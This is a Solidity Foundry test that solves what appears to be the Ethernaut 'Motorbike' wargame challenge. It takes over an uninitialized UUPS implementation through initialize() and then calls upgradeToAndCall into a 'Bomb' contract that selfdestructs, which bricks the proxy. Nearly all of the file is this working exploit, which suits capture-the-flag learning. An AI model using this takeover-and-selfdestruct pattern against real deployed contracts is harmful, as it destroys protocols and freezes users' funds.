// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Bomb {
    function explode() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    IEngine engine;
    address motorbike;
    Bomb bomb;
    address hacker = address(0x1337);

    function setUp() public {
        address engineAddr = deployCode("src/25_Motorbike.sol:Engine");
        engine = IEngine(engineAddr); 

        bytes memory args = abi.encode(engineAddr);
        motorbike = deployCode("src/25_Motorbike.sol:Motorbike", args);

        bomb = new Bomb();
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        engine.initialize();
        bytes memory data = abi.encodeWithSignature("explode()");
        engine.upgradeToAndCall(address(bomb), data);
        vm.stopPrank();
        
        IEngine deadProtocol = IEngine(motorbike);
        vm.expectRevert();
        deadProtocol.initialize();
    }
}